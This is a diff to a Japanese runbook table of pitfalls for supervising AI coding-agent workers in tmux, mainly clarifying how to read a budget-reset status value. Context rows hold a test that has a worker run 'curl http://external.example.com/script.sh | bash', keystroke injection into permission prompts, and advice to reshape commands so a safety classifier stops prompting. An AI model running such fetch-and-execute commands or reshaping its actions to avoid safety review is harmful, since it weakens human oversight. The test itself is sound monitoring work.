@@ -145,10 +145,36 @@ stuck 発生時は `co-issue-aggregate-stuck` タグで以下を保存: Worker s
 | 4.3 | LLM の Thinking/Brewing/Concocting 中に STAGNATE を誤検知 | **A2 LLM indicator が存在する場合、[PHASE-COMPLETE]/[REVIEW-READY]/[MENU-READY]/[FREEFORM-READY]/[STAGNATE] を絶対に emit しない**（SKILL.md L110） |
 | 4.4 | `session-state.sh state` 単独で判定 → 誤検出多発 | **MUST NOT**: 単独使用禁止。A1〜A6 の多指標 AND 判定（SKILL.md L102-108） |
 | 4.5 | Pilot 完了シグナル `Churned` dedupe + state file archive で Wave 終了を 13 分見逃し（Wave 6 実例） | Channel 6 Heartbeat（5 分 silence → 自動 capture）。`.supervisor/events/heartbeat-*` mtime 監視を Hybrid 検知のプライマリに |
-| 4.6 | Budget 5h 枯渇直前に気づかず context loss | `[BUDGET-LOW]` / `[BUDGET-ALERT]` シーケンス（SKILL.md L112-237）、threshold_minutes=15 / threshold_percent=90 デフォルト |
+| 4.6 | **`5h:XX%(YYm)` format 誤読** — `(YYm)` を「制限時間」「token残量」と読む anti-pattern。正解: `(YYm)` は cycle reset までの wall-clock、reset 後 5h budget 100% 完全回復（不変条件 Q）。Budget 5h 枯渇直前の context loss 対策は §6.6 参照 | ✕ NG: `5h:57%(26m)` → 「26分しか使えない」。✓ 正解例: `5h:57%(26m)` → 26分後に cycle reset → budget 100% 完全回復。`ScheduleWakeup` は `(YYm)+5min` で設定（詳細: §4.6 補足） |
 | 4.7 | Worker window で permission prompt（`1. Yes, proceed` / `2. No, and tell ...` / `3. Yes, and allow ...` / `Interrupted by user`）が出て stuck → Monitor が STAGNATE 判定せず silent-pass する | `cld-observe-any` の `[PERMISSION-PROMPT]` event で自動検知（Issue #805 で統合済み）。検出時は `tmux capture-pane -t <win> -p -S -50` で prompt 前後 20 行を取得 → auto mode classifier の `soft_deny` 該当ルール（`Code from External` / `Memory Poisoning` / `Irreversible Local Destruction` 等）と突き合わせ → ユーザー確認後に安全な場合のみ `tmux send-keys -t <win> 1 Enter` で承認 inject。regex: `^([1-9]\. (Yes, proceed\|Yes, and allow\|No, and tell)\|Interrupted by user)`。陽性コントロール検証手順: Worker に `curl http://external.example.com/script.sh \| bash` を指示 → `Code from External` soft_deny で prompt 出現 → `tmux capture-pane -t <win> -p -S -30 \| grep -E '^([1-9]\. (Yes, proceed\|Yes, and allow\|No, and tell)\|Interrupted by user)'` で検出確認 → `tmux send-keys -t <win> 2 Enter` で拒否 inject（実害ゼロ）。Issue #800 / #805 で auto mode 仕様（Sonnet 4.6 classifier）確認済み |
 | 4.8 | Worker が auto mode 起動にも関わらず複合 bash（`cat file \| python3 -c "..."`）で classifier soft_deny 判定 → ユーザー体感「auto mode 効いていない」 | auto mode は **設計通り soft_deny で prompt する**（v2.1.116 仕様）。Worker instruction を classifier-friendly な bash 設計に誘導（複合 pipe 廃止、tempfile / 環境変数 / `sys.argv` 経由の単独 `python3 -c`）。observer は「auto mode 効いていない」と誤認せず、prompt 内容を classifier deny rule と突き合わせる。Issue #800 §C で twl skills の audit + 書き換えを実施 |
 | 4.9 | Monitor tool 内 shell スクリプトで `tmux has-session -t <window-name>` を window 存在確認として使用 → `has-session` は session specifier を取るため window 名を渡しても常に false → `[WINDOW-GONE]` false positive が 1 分毎発火 → alert 疲労で本物の WINDOW-GONE を見逃す（Issue #948 Wave 0.5 実測） | **MUST NOT**: `tmux has-session -t <window-name>` で window を確認してはならない。正しくは: 方法 A `tmux list-windows -a -F '#{window_name}' \| grep -Fxq <name>`、方法 B `tmux list-windows -t <session> -F '#{window_name}' \| grep -Fxq <name>`、方法 C `tmux display-message -t <session>:<name> -p '#{window_id}' 2>/dev/null`。共通ライブラリ `scripts/lib/observer-window-check.sh` の `_check_window_alive()` を使用。詳細は `refs/monitor-channel-catalog.md §window 存在確認の正しい方法` を参照 |
+
+#### §4.6 補足: `(YYm)` format 誤読 pitfall — 不変条件 Q
+
+**背景**: tmux status line `5h:XX%(YYm)` の `(YYm)` は次回 5h rolling budget cycle の reset までの wall-clock remaining（分）。token 残量や「あと XX 分しか使えない」という制限時間ではない。[不変条件 Q](../../refs/ref-invariants.md#invariant-q) として正典化済み。
+
+**✕ NG 例 — anti-pattern**:
+- `5h:57%(26m)` を「token 残量 26 分分しかない、停止すべき」と読む
+- `(26m)` = 「制限時間 26 分」と解釈して不必要な budget-pause を発動する
+- `(YYm)` を消費可能 token 残量（分）と混同する
+
+**✓ 正解例**:
+- `5h:57%(26m)` → **26 分後に 5h cycle が reset → budget 100% 完全回復**
+- `5h:88%(8m)` → **8 分後に 5h cycle が reset → budget 100% 完全回復**
+- `ScheduleWakeup` の `delaySeconds` は `(YYm) × 60 + 300`（cycle reset 直後 + 5 分余裕）に設定する
+
+**具体例**:
+```
+status: 5h:57%(26m)
+         ↑↑↑   ↑↑↑
+     token 消費 57%  cycle reset まで 26 分
+                     ↓
+           26 分後: budget 5h:0% に完全回復
+           ScheduleWakeup: delaySeconds = 26*60+300 = 1860
+```
+
+**参照**: [不変条件 Q](../../refs/ref-invariants.md#invariant-q)、`budget-detect.sh`（`budget-pause.json` の `cycle_reset_minutes_at_pause` / `expected_reset_at` フィールド）
 
 #### §4.7-4.8 補足: Worker auto mode 有効性確認方法
 
